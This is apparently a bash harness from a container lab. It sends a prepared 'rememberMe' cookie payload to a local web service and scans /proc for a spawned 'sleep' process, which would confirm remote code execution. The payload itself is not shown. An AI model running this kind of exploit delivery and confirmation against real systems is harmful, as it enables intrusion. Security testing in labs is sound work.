#!/bin/bash
# loop3 t7 C1 — 容器内决定性判定（在容器里跑）
CK=$(cat /tmp/pw-ck.txt)
echo "cookie_len=${#CK}"
echo "=== baseline proc scan ==="
ls /proc | grep -E '^[0-9]+$' | wc -l
echo "=== fire payload in background, watch /proc for 'sleep' ==="
( curl -s -o /dev/null -m 45 -H "Cookie: rememberMe=$CK" http://127.0.0.1:8080/ ; echo "[req done]" ) &
found=0
for i in $(seq 1 60); do
  for p in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
    if [ -r /proc/$p/cmdline ]; then
      cl=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)
      case "$cl" in
        *sleep*) echo "FOUND_PROC pid=$p cmd=[$cl]"; found=$((found+1));;
      esac
    fi
  done
  sleep 0.2
done
echo "sleep_procs_found=$found"
wait
echo "=== DONE ==="
